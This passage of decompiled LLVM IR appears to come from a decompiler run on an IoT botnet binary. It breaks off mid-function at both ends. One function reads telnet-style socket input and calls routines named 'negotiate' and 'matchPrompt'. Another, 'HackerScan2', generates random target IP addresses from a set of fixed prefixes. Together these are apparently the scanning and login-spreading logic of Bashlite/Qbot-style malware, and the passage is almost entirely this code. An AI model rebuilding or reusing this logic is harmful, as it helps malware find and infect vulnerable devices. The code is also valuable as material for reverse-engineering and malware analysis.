  %v2_a5b8 = add i32 %v2_a5b4, %v13_a510
  %v1_a5bc = inttoptr i32 %v2_a5b8 to i32*
  br label %dec_label_pc_a754

dec_label_pc_a574.lr.ph:                          ; preds = %dec_label_pc_a768, %dec_label_pc_a774
  br label %dec_label_pc_a574

dec_label_pc_a574:                                ; preds = %dec_label_pc_a574.lr.ph, %dec_label_pc_a574
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a574.lr.ph ], [ %v1_a588, %dec_label_pc_a574 ]
  %v5_a580 = mul nuw nsw i32 %storemerge27, 4
  %v6_a580 = add i32 %v5_a580, %v2_a560
  %v7_a580 = inttoptr i32 %v6_a580 to i32*
  store i32 0, i32* %v7_a580, align 4
  %v1_a588 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a588, 32
  br i1 %tmp30, label %dec_label_pc_a574, label %dec_label_pc_a59c

dec_label_pc_a59c:                                ; preds = %dec_label_pc_a574
  %v2_a5bc = load i32, i32* %v1_a5bc, align 4
  %v2_a5d0 = or i32 %v2_a5bc, %v6_a5cc
  store i32 %v2_a5d0, i32* %v1_a5bc, align 4
  %v5_a60c = call i32 @__libc_select(i32 %v1_a5f0, i32 %v2_a560, i32 0, i32 0, i32 %v2_a5f8)
  %tmp31 = icmp slt i32 %v5_a60c, 1
  br i1 %tmp31, label %dec_label_pc_a798, label %dec_label_pc_a61c

dec_label_pc_a61c:                                ; preds = %dec_label_pc_a59c
  %v2_a628 = add i32 %stack_var_-40.0, %arg6
  %v5_a62c = inttoptr i32 %v2_a628 to i8*
  %v6_a640 = call i32 @__libc_recv(i32 %arg1, i32 %v2_a628, i32 1, i32 0, i32 %v2_a628)
  %v7_a650 = icmp eq i32 %v6_a640, -1
  br i1 %v7_a650, label %dec_label_pc_a664, label %dec_label_pc_a658

dec_label_pc_a658:                                ; preds = %dec_label_pc_a61c
  %v2_a65c = icmp eq i32 %v6_a640, 0
  br i1 %v2_a65c, label %dec_label_pc_a664, label %dec_label_pc_a670

dec_label_pc_a664:                                ; preds = %dec_label_pc_a658, %dec_label_pc_a61c
  br label %dec_label_pc_a7a0

dec_label_pc_a670:                                ; preds = %dec_label_pc_a658
  %v2_a678 = add i32 %v6_a640, %stack_var_-40.0
  %v2_a684 = load i8, i8* %v5_a62c, align 1
  %v2_a688 = icmp eq i8 %v2_a684, -1
  br i1 %v2_a688, label %dec_label_pc_a690, label %dec_label_pc_a710

dec_label_pc_a690:                                ; preds = %dec_label_pc_a670
  %v1_a694 = add i32 %v2_a628, 1
  %v5_a6a8 = call i32 @__libc_recv(i32 %arg1, i32 %v1_a694, i32 2, i32 0, i32 %v2_a678)
  %v7_a6b8 = icmp eq i32 %v5_a6a8, -1
  br i1 %v7_a6b8, label %dec_label_pc_a6cc, label %dec_label_pc_a6c0

dec_label_pc_a6c0:                                ; preds = %dec_label_pc_a690
  %v2_a6c4 = icmp eq i32 %v5_a6a8, 0
  br i1 %v2_a6c4, label %dec_label_pc_a6cc, label %dec_label_pc_a6d8

dec_label_pc_a6cc:                                ; preds = %dec_label_pc_a6c0, %dec_label_pc_a690
  br label %dec_label_pc_a7a0

dec_label_pc_a6d8:                                ; preds = %dec_label_pc_a6c0
  %v2_a6e0 = add i32 %v5_a6a8, %v2_a678
  %v3_a6f4 = call i32 @negotiate(i32 %arg1, i32 %v2_a628, i32 3)
  %v2_a6fc = icmp eq i32 %v3_a6f4, 0
  br i1 %v2_a6fc, label %dec_label_pc_a704, label %dec_label_pc_a754

dec_label_pc_a704:                                ; preds = %dec_label_pc_a6d8
  br label %dec_label_pc_a7a0

dec_label_pc_a710:                                ; preds = %dec_label_pc_a670
  %v7_a718 = call i32 @strstr(i32 %arg6, i8* %v6_a718)
  %v2_a720 = icmp eq i32 %v7_a718, 0
  br i1 %v2_a720, label %dec_label_pc_a728, label %dec_label_pc_a78c

dec_label_pc_a728:                                ; preds = %dec_label_pc_a710
  br i1 %v2_a72c, label %dec_label_pc_a754, label %dec_label_pc_a734

dec_label_pc_a734:                                ; preds = %dec_label_pc_a728
  %v2_a738 = call i32 @matchPrompt(i8* %v1_a738)
  %v2_a740 = icmp eq i32 %v2_a738, 0
  br i1 %v2_a740, label %dec_label_pc_a754, label %dec_label_pc_a78c

dec_label_pc_a754:                                ; preds = %dec_label_pc_a6d8, %dec_label_pc_a734, %dec_label_pc_a728, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a6e0, %dec_label_pc_a6d8 ], [ %v2_a678, %dec_label_pc_a728 ], [ %v2_a678, %dec_label_pc_a734 ]
  %v1_a758 = add i32 %stack_var_-40.0, 2
  %v6_a764 = icmp slt i32 %v1_a758, %arg7
  br i1 %v6_a764, label %dec_label_pc_a768, label %dec_label_pc_a798

dec_label_pc_a768:                                ; preds = %dec_label_pc_a754
  %v3_a768 = load i32, i32* %stack_var_-176, align 4
  %v5_a770 = icmp sgt i32 %v3_a768, 0
  br i1 %v5_a770, label %dec_label_pc_a574.lr.ph, label %dec_label_pc_a774

dec_label_pc_a774:                                ; preds = %dec_label_pc_a768
  br i1 %v5_a77c, label %dec_label_pc_a574.lr.ph, label %dec_label_pc_a798

dec_label_pc_a78c:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a734
  br label %dec_label_pc_a7a0

dec_label_pc_a798:                                ; preds = %dec_label_pc_a59c, %dec_label_pc_a774, %dec_label_pc_a754
  br label %dec_label_pc_a7a0

dec_label_pc_a7a0:                                ; preds = %dec_label_pc_a78c, %dec_label_pc_a704, %dec_label_pc_a6cc, %dec_label_pc_a664, %dec_label_pc_a798
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a798 ], [ 1, %dec_label_pc_a78c ], [ 0, %dec_label_pc_a664 ], [ 0, %dec_label_pc_a6cc ], [ 0, %dec_label_pc_a704 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v5_a6a8, { 1, 2, 0 }
  uselistorder i32 %v6_a640, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a560, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a7a0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a798, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a78c, { 1, 0 }
  uselistorder label %dec_label_pc_a754, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a574, { 1, 0 }
  uselistorder label %dec_label_pc_a574.lr.ph, { 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a7b8 = load i32, i32* @fp, align 4
  store i32 42944, i32* %stack_var_-4, align 4
  %v2_a7bc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a7bc, i32* @fp, align 4
  store i8 0, i8* @global_var_2c5ff.64, align 1
  store i8 0, i8* @global_var_2c600.65, align 1
  store i8 0, i8* @global_var_2c601.66, align 1
  store i8 0, i8* @global_var_2c602.67, align 1
  %v0_a7f4 = call i32 @rand()
  %v2_a810 = sdiv i32 %v0_a7f4, 51
  %tmp219 = mul i32 %v2_a810, -255
  %v2_a828 = add i32 %tmp219, %v0_a7f4
  %v1_a83c = trunc i32 %v2_a828 to i8
  store i8 %v1_a83c, i8* @global_var_2c5ff.64, align 1
  %v0_a840 = call i32 @rand()
  %v2_a85c = sdiv i32 %v0_a840, 51
  %tmp220 = mul i32 %v2_a85c, -255
  %v2_a874 = add i32 %tmp220, %v0_a840
  %v1_a888 = trunc i32 %v2_a874 to i8
  store i8 %v1_a888, i8* @global_var_2c600.65, align 1
  %v0_a88c = call i32 @rand()
  %v2_a8a8 = sdiv i32 %v0_a88c, 51
  %tmp221 = mul i32 %v2_a8a8, -255
  %v2_a8c0 = add i32 %tmp221, %v0_a88c
  %v1_a8d4 = trunc i32 %v2_a8c0 to i8
  store i8 %v1_a8d4, i8* @global_var_2c601.66, align 1
  %v0_a8d8 = call i32 @rand()
  %v2_a8f4 = sdiv i32 %v0_a8d8, 51
  %tmp222 = mul i32 %v2_a8f4, -255
  %v2_a90c = add i32 %tmp222, %v0_a8d8
  %v1_a920 = trunc i32 %v2_a90c to i8
  store i8 %v1_a920, i8* @global_var_2c602.67, align 1
  %v0_a924 = call i32 @rand()
  %v2_a93c = srem i32 %v0_a924, 208
  %v2_a964 = icmp eq i32 %v2_a93c, 0
  br i1 %v2_a964, label %dec_label_pc_a96c, label %dec_label_pc_a994

dec_label_pc_a96c:                                ; preds = %entry
  %v2_a96c = ptrtoint i32* %stack_var_-36 to i32
  %v3_a978 = load i8, i8* @global_var_2c601.66, align 1
  %v3_a984 = load i8, i8* @global_var_2c602.67, align 1
  %v4_a990 = sext i8 %v3_a978 to i32
  %v6_a990 = sext i8 %v3_a984 to i32
  %v8_a990 = call i32 @szprintf(i32 %v2_a96c, i32 ptrtoint ([12 x i8]* @global_var_1fdc4.71 to i32), i32 %v4_a990, i32 %v6_a990, i32 0)
  br label %dec_label_pc_a994

dec_label_pc_a994:                                ; preds = %entry, %dec_label_pc_a96c
  %v7_a998 = icmp eq i32 %v2_a93c, 1
  br i1 %v7_a998, label %dec_label_pc_a9a0, label %dec_label_pc_a9c8

dec_label_pc_a9a0:                                ; preds = %dec_label_pc_a994
  %v2_a9a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_a9ac = load i8, i8* @global_var_2c601.66, align 1
  %v3_a9b8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_a9c4 = sext i8 %v3_a9ac to i32
  %v6_a9c4 = sext i8 %v3_a9b8 to i32
  %v8_a9c4 = call i32 @szprintf(i32 %v2_a9a0, i32 ptrtoint ([14 x i8]* @global_var_1fdd0.73 to i32), i32 %v4_a9c4, i32 %v6_a9c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9c8

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_a994, %dec_label_pc_a9a0
  %v7_a9cc = icmp eq i32 %v2_a93c, 2
  br i1 %v7_a9cc, label %dec_label_pc_a9d4, label %dec_label_pc_a9fc

dec_label_pc_a9d4:                                ; preds = %dec_label_pc_a9c8
  %v2_a9d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_a9e0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_a9ec = load i8, i8* @global_var_2c602.67, align 1
  %v4_a9f8 = sext i8 %v3_a9e0 to i32
  %v6_a9f8 = sext i8 %v3_a9ec to i32
  %v8_a9f8 = call i32 @szprintf(i32 %v2_a9d4, i32 ptrtoint ([11 x i8]* @global_var_1fde0.75 to i32), i32 %v4_a9f8, i32 %v6_a9f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9fc

dec_label_pc_a9fc:                                ; preds = %dec_label_pc_a9c8, %dec_label_pc_a9d4
  %v7_aa00 = icmp eq i32 %v2_a93c, 3
  br i1 %v7_aa00, label %dec_label_pc_aa08, label %dec_label_pc_aa30

dec_label_pc_aa08:                                ; preds = %dec_label_pc_a9fc
  %v2_aa08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aa14 = load i8, i8* @global_var_2c601.66, align 1
  %v3_aa20 = load i8, i8* @global_var_2c602.67, align 1
  %v4_aa2c = sext i8 %v3_aa14 to i32
  %v6_aa2c = sext i8 %v3_aa20 to i32
  %v8_aa2c = call i32 @szprintf(i32 %v2_aa08, i32 ptrtoint ([13 x i8]* @global_var_1fdec.77 to i32), i32 %v4_aa2c, i32 %v6_aa2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa30

dec_label_pc_aa30:                                ; preds = %dec_label_pc_a9fc, %dec_label_pc_aa08
  %v7_aa34 = icmp eq i32 %v2_a93c, 4
  br i1 %v7_aa34, label %dec_label_pc_aa3c, label %dec_label_pc_aa64

dec_label_pc_aa3c:                                ; preds = %dec_label_pc_aa30
  %v2_aa3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_aa48 = load i8, i8* @global_var_2c601.66, align 1
  %v3_aa54 = load i8, i8* @global_var_2c602.67, align 1
  %v4_aa60 = sext i8 %v3_aa48 to i32
  %v6_aa60 = sext i8 %v3_aa54 to i32
  %v8_aa60 = call i32 @szprintf(i32 %v2_aa3c, i32 ptrtoint ([11 x i8]* @global_var_1fdfc.79 to i32), i32 %v4_aa60, i32 %v6_aa60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa30, %dec_label_pc_aa3c
  %v7_aa68 = icmp eq i32 %v2_a93c, 5
  br i1 %v7_aa68, label %dec_label_pc_aa70, label %dec_label_pc_aa98

dec_label_pc_aa70:                                ; preds = %dec_label_pc_aa64
  %v2_aa70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aa7c = load i8, i8* @global_var_2c601.66, align 1
  %v3_aa88 = load i8, i8* @global_var_2c602.67, align 1
  %v4_aa94 = sext i8 %v3_aa7c to i32
  %v6_aa94 = sext i8 %v3_aa88 to i32
  %v8_aa94 = call i32 @szprintf(i32 %v2_aa70, i32 ptrtoint ([13 x i8]* @global_var_1fe08.81 to i32), i32 %v4_aa94, i32 %v6_aa94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa98

dec_label_pc_aa98:                                ; preds = %dec_label_pc_aa64, %dec_label_pc_aa70
  %v7_aa9c = icmp eq i32 %v2_a93c, 6
  br i1 %v7_aa9c, label %dec_label_pc_aaa4, label %dec_label_pc_aacc

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_aa98
  %v2_aaa4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aab0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_aabc = load i8, i8* @global_var_2c602.67, align 1
  %v4_aac8 = sext i8 %v3_aab0 to i32
  %v6_aac8 = sext i8 %v3_aabc to i32
  %v8_aac8 = call i32 @szprintf(i32 %v2_aaa4, i32 ptrtoint ([12 x i8]* @global_var_1fe18.83 to i32), i32 %v4_aac8, i32 %v6_aac8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aacc

dec_label_pc_aacc:                                ; preds = %dec_label_pc_aa98, %dec_label_pc_aaa4
  %v7_aad0 = icmp eq i32 %v2_a93c, 7
  br i1 %v7_aad0, label %dec_label_pc_aad8, label %dec_label_pc_ab00

dec_label_pc_aad8:                                ; preds = %dec_label_pc_aacc
  %v2_aad8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aae4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_aaf0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_aafc = sext i8 %v3_aae4 to i32
  %v6_aafc = sext i8 %v3_aaf0 to i32
  %v8_aafc = call i32 @szprintf(i32 %v2_aad8, i32 ptrtoint ([13 x i8]* @global_var_1fe24.85 to i32), i32 %v4_aafc, i32 %v6_aafc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab00

dec_label_pc_ab00:                                ; preds = %dec_label_pc_aacc, %dec_label_pc_aad8
  %v7_ab04 = icmp eq i32 %v2_a93c, 8
  br i1 %v7_ab04, label %dec_label_pc_ab0c, label %dec_label_pc_ab34

dec_label_pc_ab0c:                                ; preds = %dec_label_pc_ab00
  %v2_ab0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ab18 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ab24 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ab30 = sext i8 %v3_ab18 to i32
  %v6_ab30 = sext i8 %v3_ab24 to i32
  %v8_ab30 = call i32 @szprintf(i32 %v2_ab0c, i32 ptrtoint ([13 x i8]* @global_var_1fe34.87 to i32), i32 %v4_ab30, i32 %v6_ab30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab34

dec_label_pc_ab34:                                ; preds = %dec_label_pc_ab00, %dec_label_pc_ab0c
  %v7_ab38 = icmp eq i32 %v2_a93c, 9
  br i1 %v7_ab38, label %dec_label_pc_ab40, label %dec_label_pc_ab68

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab34
  %v2_ab40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ab4c = load i8, i8* @global_var_2c601.66, align 1
  %v3_ab58 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ab64 = sext i8 %v3_ab4c to i32
  %v6_ab64 = sext i8 %v3_ab58 to i32
  %v8_ab64 = call i32 @szprintf(i32 %v2_ab40, i32 ptrtoint ([13 x i8]* @global_var_1fe44.89 to i32), i32 %v4_ab64, i32 %v6_ab64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab68

dec_label_pc_ab68:                                ; preds = %dec_label_pc_ab34, %dec_label_pc_ab40
  %v7_ab6c = icmp eq i32 %v2_a93c, 10
  br i1 %v7_ab6c, label %dec_label_pc_ab74, label %dec_label_pc_ab9c

dec_label_pc_ab74:                                ; preds = %dec_label_pc_ab68
  %v2_ab74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ab80 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ab8c = load i8, i8* @global_var_2c602.67, align 1
  %v4_ab98 = sext i8 %v3_ab80 to i32
  %v6_ab98 = sext i8 %v3_ab8c to i32
  %v8_ab98 = call i32 @szprintf(i32 %v2_ab74, i32 ptrtoint ([14 x i8]* @global_var_1fe54.91 to i32), i32 %v4_ab98, i32 %v6_ab98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab9c

dec_label_pc_ab9c:                                ; preds = %dec_label_pc_ab68, %dec_label_pc_ab74
  %v7_aba0 = icmp eq i32 %v2_a93c, 11
  br i1 %v7_aba0, label %dec_label_pc_aba8, label %dec_label_pc_abd0

dec_label_pc_aba8:                                ; preds = %dec_label_pc_ab9c
  %v2_aba8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_abb4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_abc0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_abcc = sext i8 %v3_abb4 to i32
  %v6_abcc = sext i8 %v3_abc0 to i32
  %v8_abcc = call i32 @szprintf(i32 %v2_aba8, i32 ptrtoint ([11 x i8]* @global_var_1fe64.93 to i32), i32 %v4_abcc, i32 %v6_abcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abd0

dec_label_pc_abd0:                                ; preds = %dec_label_pc_ab9c, %dec_label_pc_aba8
  %v7_abd4 = icmp eq i32 %v2_a93c, 12
  br i1 %v7_abd4, label %dec_label_pc_abdc, label %dec_label_pc_ac04

dec_label_pc_abdc:                                ; preds = %dec_label_pc_abd0
  %v2_abdc = ptrtoint i32* %stack_var_-36 to i32
  %v3_abe8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_abf4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ac00 = sext i8 %v3_abe8 to i32
  %v6_ac00 = sext i8 %v3_abf4 to i32
  %v8_ac00 = call i32 @szprintf(i32 %v2_abdc, i32 ptrtoint ([13 x i8]* @global_var_1fe70.95 to i32), i32 %v4_ac00, i32 %v6_ac00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac04

dec_label_pc_ac04:                                ; preds = %dec_label_pc_abd0, %dec_label_pc_abdc
  %v7_ac08 = icmp eq i32 %v2_a93c, 13
  br i1 %v7_ac08, label %dec_label_pc_ac10, label %dec_label_pc_ac38

dec_label_pc_ac10:                                ; preds = %dec_label_pc_ac04
  %v2_ac10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac1c = load i8, i8* @global_var_2c601.66, align 1
  %v3_ac28 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ac34 = sext i8 %v3_ac1c to i32
  %v6_ac34 = sext i8 %v3_ac28 to i32
  %v8_ac34 = call i32 @szprintf(i32 %v2_ac10, i32 ptrtoint ([13 x i8]* @global_var_1fe80.97 to i32), i32 %v4_ac34, i32 %v6_ac34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac38

dec_label_pc_ac38:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_ac10
  %v7_ac3c = icmp eq i32 %v2_a93c, 14
  br i1 %v7_ac3c, label %dec_label_pc_ac44, label %dec_label_pc_ac6c

dec_label_pc_ac44:                                ; preds = %dec_label_pc_ac38
  %v2_ac44 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac50 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ac5c = load i8, i8* @global_var_2c602.67, align 1
  %v4_ac68 = sext i8 %v3_ac50 to i32
  %v6_ac68 = sext i8 %v3_ac5c to i32
  %v8_ac68 = call i32 @szprintf(i32 %v2_ac44, i32 ptrtoint ([13 x i8]* @global_var_1fe90.99 to i32), i32 %v4_ac68, i32 %v6_ac68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac6c

dec_label_pc_ac6c:                                ; preds = %dec_label_pc_ac38, %dec_label_pc_ac44
  %v7_ac70 = icmp eq i32 %v2_a93c, 15
  br i1 %v7_ac70, label %dec_label_pc_ac78, label %dec_label_pc_aca0

dec_label_pc_ac78:                                ; preds = %dec_label_pc_ac6c
  %v2_ac78 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac84 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ac90 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ac9c = sext i8 %v3_ac84 to i32
  %v6_ac9c = sext i8 %v3_ac90 to i32
  %v8_ac9c = call i32 @szprintf(i32 %v2_ac78, i32 ptrtoint ([13 x i8]* @global_var_1fea0.101 to i32), i32 %v4_ac9c, i32 %v6_ac9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aca0

dec_label_pc_aca0:                                ; preds = %dec_label_pc_ac6c, %dec_label_pc_ac78
  %v7_aca4 = icmp eq i32 %v2_a93c, 16
  br i1 %v7_aca4, label %dec_label_pc_acac, label %dec_label_pc_acd4

dec_label_pc_acac:                                ; preds = %dec_label_pc_aca0
  %v2_acac = ptrtoint i32* %stack_var_-36 to i32
  %v3_acb8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_acc4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_acd0 = sext i8 %v3_acb8 to i32
  %v6_acd0 = sext i8 %v3_acc4 to i32
  %v8_acd0 = call i32 @szprintf(i32 %v2_acac, i32 ptrtoint ([13 x i8]* @global_var_1feb0.103 to i32), i32 %v4_acd0, i32 %v6_acd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_acd4

dec_label_pc_acd4:                                ; preds = %dec_label_pc_aca0, %dec_label_pc_acac
  %v7_acd8 = icmp eq i32 %v2_a93c, 17
  br i1 %v7_acd8, label %dec_label_pc_ace0, label %dec_label_pc_ad08

dec_label_pc_ace0:                                ; preds = %dec_label_pc_acd4
  %v2_ace0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_acec = load i8, i8* @global_var_2c601.66, align 1
  %v3_acf8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ad04 = sext i8 %v3_acec to i32
  %v6_ad04 = sext i8 %v3_acf8 to i32
  %v8_ad04 = call i32 @szprintf(i32 %v2_ace0, i32 ptrtoint ([13 x i8]* @global_var_1fec0.105 to i32), i32 %v4_ad04, i32 %v6_ad04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad08

dec_label_pc_ad08:                                ; preds = %dec_label_pc_acd4, %dec_label_pc_ace0
  %v7_ad0c = icmp eq i32 %v2_a93c, 18
  br i1 %v7_ad0c, label %dec_label_pc_ad14, label %dec_label_pc_ad3c

dec_label_pc_ad14:                                ; preds = %dec_label_pc_ad08
  %v2_ad14 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad20 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ad2c = load i8, i8* @global_var_2c602.67, align 1
  %v4_ad38 = sext i8 %v3_ad20 to i32
  %v6_ad38 = sext i8 %v3_ad2c to i32
  %v8_ad38 = call i32 @szprintf(i32 %v2_ad14, i32 ptrtoint ([13 x i8]* @global_var_1fed0.107 to i32), i32 %v4_ad38, i32 %v6_ad38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad3c

dec_label_pc_ad3c:                                ; preds = %dec_label_pc_ad08, %dec_label_pc_ad14
  %v7_ad40 = icmp eq i32 %v2_a93c, 19
  br i1 %v7_ad40, label %dec_label_pc_ad48, label %dec_label_pc_ad70

dec_label_pc_ad48:                                ; preds = %dec_label_pc_ad3c
  %v2_ad48 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad54 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ad60 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ad6c = sext i8 %v3_ad54 to i32
  %v6_ad6c = sext i8 %v3_ad60 to i32
  %v8_ad6c = call i32 @szprintf(i32 %v2_ad48, i32 ptrtoint ([11 x i8]* @global_var_1fee0.109 to i32), i32 %v4_ad6c, i32 %v6_ad6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad70

dec_label_pc_ad70:                                ; preds = %dec_label_pc_ad3c, %dec_label_pc_ad48
  %v7_ad74 = icmp eq i32 %v2_a93c, 20
  br i1 %v7_ad74, label %dec_label_pc_ad7c, label %dec_label_pc_ada4

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_ad70
  %v2_ad7c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad88 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ad94 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ada0 = sext i8 %v3_ad88 to i32
  %v6_ada0 = sext i8 %v3_ad94 to i32
  %v8_ada0 = call i32 @szprintf(i32 %v2_ad7c, i32 ptrtoint ([12 x i8]* @global_var_1feec.111 to i32), i32 %v4_ada0, i32 %v6_ada0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ada4

dec_label_pc_ada4:                                ; preds = %dec_label_pc_ad70, %dec_label_pc_ad7c
  %v7_ada8 = icmp eq i32 %v2_a93c, 21
  br i1 %v7_ada8, label %dec_label_pc_adb0, label %dec_label_pc_add8

dec_label_pc_adb0:                                ; preds = %dec_label_pc_ada4
  %v2_adb0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_adbc = load i8, i8* @global_var_2c601.66, align 1
  %v3_adc8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_add4 = sext i8 %v3_adbc to i32
  %v6_add4 = sext i8 %v3_adc8 to i32
  %v8_add4 = call i32 @szprintf(i32 %v2_adb0, i32 ptrtoint ([13 x i8]* @global_var_1fef8.113 to i32), i32 %v4_add4, i32 %v6_add4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_add8

dec_label_pc_add8:                                ; preds = %dec_label_pc_ada4, %dec_label_pc_adb0
  %v7_addc = icmp eq i32 %v2_a93c, 22
  br i1 %v7_addc, label %dec_label_pc_ade4, label %dec_label_pc_ae0c

dec_label_pc_ade4:                                ; preds = %dec_label_pc_add8
  %v2_ade4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_adf0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_adfc = load i8, i8* @global_var_2c602.67, align 1
  %v4_ae08 = sext i8 %v3_adf0 to i32
  %v6_ae08 = sext i8 %v3_adfc to i32
  %v8_ae08 = call i32 @szprintf(i32 %v2_ade4, i32 ptrtoint ([11 x i8]* @global_var_1ff08.115 to i32), i32 %v4_ae08, i32 %v6_ae08, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_add8, %dec_label_pc_ade4
  %v7_ae10 = icmp eq i32 %v2_a93c, 23
  br i1 %v7_ae10, label %dec_label_pc_ae18, label %dec_label_pc_ae40

dec_label_pc_ae18:                                ; preds = %dec_label_pc_ae0c
  %v2_ae18 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae24 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ae30 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ae3c = sext i8 %v3_ae24 to i32
  %v6_ae3c = sext i8 %v3_ae30 to i32
  %v8_ae3c = call i32 @szprintf(i32 %v2_ae18, i32 ptrtoint ([11 x i8]* @global_var_1ff14.117 to i32), i32 %v4_ae3c, i32 %v6_ae3c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae40

dec_label_pc_ae40:                                ; preds = %dec_label_pc_ae0c, %dec_label_pc_ae18
  %v7_ae44 = icmp eq i32 %v2_a93c, 24
  br i1 %v7_ae44, label %dec_label_pc_ae4c, label %dec_label_pc_ae74

dec_label_pc_ae4c:                                ; preds = %dec_label_pc_ae40
  %v2_ae4c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae58 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ae64 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ae70 = sext i8 %v3_ae58 to i32
  %v6_ae70 = sext i8 %v3_ae64 to i32
  %v8_ae70 = call i32 @szprintf(i32 %v2_ae4c, i32 ptrtoint ([12 x i8]* @global_var_1ff20.119 to i32), i32 %v4_ae70, i32 %v6_ae70, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae74

dec_label_pc_ae74:                                ; preds = %dec_label_pc_ae40, %dec_label_pc_ae4c
  %v7_ae78 = icmp eq i32 %v2_a93c, 25
  br i1 %v7_ae78, label %dec_label_pc_ae80, label %dec_label_pc_aea8

